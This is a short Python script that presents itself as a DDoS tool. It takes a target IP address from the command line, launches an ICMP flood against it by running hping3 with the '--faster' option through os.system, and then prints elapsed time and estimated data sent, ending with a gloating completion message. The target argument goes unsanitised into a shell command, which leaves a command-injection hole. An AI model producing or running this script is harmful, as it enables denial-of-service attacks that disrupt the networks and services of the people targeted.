import os
import sys
import time
import datetime
import signal

# Global vars
ERROR_BAD_ARGV_FROM_USER='[DDoS] Error, incorrect arguments: '
INFO_INIT_1='[DDoS] Starting the attack on the IP '
INFO_INIT_2='  (Press CTRL+C to Stop it)...'
INFO_STATS='[DDoS] Coming out, showing stats:'
ATTACK_FIN='[DDoS] Completed Attack  >:D'
PKTS_CADENCE=100
PKTS_LEN=1442
DATA_LEN=1000000
DATA_STR='MB'
INIT_WAIT=4


# To get current time  
def get_str_time():
	return ('['+(datetime.datetime.now()).strftime('%H:%M:%S')+']')

# To get time difference
def diff():
	return (datetime.datetime.now() - time_init)

# To prepare stats
def stats():
	return ('[+] Time Elapsed: '+str(diff()) + '\n' + '[+] Data sent: ' 
		+ str(diff().total_seconds() * PKTS_CADENCE * PKTS_LEN / DATA_LEN) + ' '+DATA_STR+'\n')

if __name__ == "__main__":
	
	# Check argvs params
	if len(sys.argv) != 2:
		print( get_str_time() + ERROR_BAD_ARGV_FROM_USER + '\n\n\t Usage: python3 '+ sys.argv[0] + ' <Destination IP>')
		exit(-1)
	
	# Stats vars
	time_init = datetime.datetime.now()
	
	# Just for telling to the user how to stop the attack
	print(INFO_INIT_1 + sys.argv[1] + INFO_INIT_2)
	os.system('sleep '+str(INIT_WAIT))

	# Main command
	os.system('hping3 -V -1 -d 1400 --faster ' + sys.argv[1])	

	# Show stats
	print('\n\n'+get_str_time() + INFO_STATS + '\n\n'+ stats())
	print(get_str_time() + ATTACK_FIN)
